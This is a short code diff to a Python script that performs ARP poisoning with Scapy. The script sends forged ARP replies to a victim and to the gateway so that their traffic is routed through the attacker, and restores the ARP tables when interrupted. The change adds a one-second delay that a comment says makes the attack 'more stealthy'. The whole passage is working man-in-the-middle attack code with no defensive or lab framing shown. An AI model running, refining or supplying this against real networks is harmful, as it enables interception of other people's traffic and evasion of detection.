@@ -21,10 +21,10 @@ while True:
         
         send(ARP(op=2, pdst=victimIP, hwdst=victimMAC, psrc=gatewayIP))
         send(ARP(op=2, pdst=gatewayIP, hwdst=gatewayMAC, psrc=victimIP))
+        sleep (1) #set to 1 second to avoid flooding the network and to make the attack more stealthy
     except KeyboardInterrupt:
         print("Cleaning ARP tables...")
         print("Stopping ARP poison attack on "+victimIP+" and "+gatewayIP)
         send(ARP(op=2, pdst=gatewayIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=4)
         send(ARP(op=2, pdst=victimIP, psrc=gatewayIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gatewayMAC), count=4)
         exit()
-        
